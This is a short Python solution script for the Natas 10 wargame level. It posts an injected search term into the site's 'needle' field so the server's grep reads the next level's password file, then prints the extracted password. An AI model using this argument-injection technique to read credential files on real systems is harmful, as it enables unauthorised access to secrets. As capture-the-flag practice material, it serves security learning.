import requests
import re
import sys

url = "http://natas10.natas.labs.overthewire.org/"
auth = ("natas10", "secret")

payload = ". /etc/natas_webpass/natas11"

data = {
    "needle": payload # We put the command in variable with name "payload" and select that command for other variable "needle" that is name of input field in current website
}

req_post = requests.post(url=url, data=data, auth=auth) # Injecting the command into the input field.

flag = re.search(r"/etc/natas_webpass/natas11:([A-Za-z0-9]{32})", req_post.text, re.IGNORECASE) # searching the password in reponse that sended us by server.
if flag:
    print(f"[+]Finally you can got it! your password is: {flag.group(1)}")
else:
    sys.exit("[-]Error to inject the command into input field.")